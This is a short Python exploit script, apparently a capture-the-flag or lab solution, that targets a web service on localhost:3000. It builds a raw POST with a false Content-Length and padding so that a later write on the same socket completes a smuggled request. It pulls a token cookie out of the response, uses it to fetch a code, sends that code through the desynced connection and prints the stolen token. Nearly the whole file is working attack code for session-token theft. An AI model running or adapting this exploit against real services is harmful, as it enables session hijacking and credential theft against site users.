import re
import socket
import requests

request = b'\r\n'.join([
    b'POST /new HTTP/1.1',
    b'Host: localhost:3000',
    b'Content-Type: text/plain',
    b'Content-Length: 500',
    b'',
    b'a=' + b'A' * 438 + b'refer=',
])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 3000))

s.send(request)

data = s.recv(1024)
header = data.split(b'\r\n')[2]
cookie = re.findall(r'token=(.*)', header.decode('utf-8'))[0]

code = requests.get(
    'http://localhost:3000/code',
    cookies={'token': cookie},
).text
code = re.findall(r'<strong>(.*)</strong>', code)[0]
s.send((code.encode('utf-8') + b'&name=a').ljust(54, b'a'))
s.close()

print(cookie)
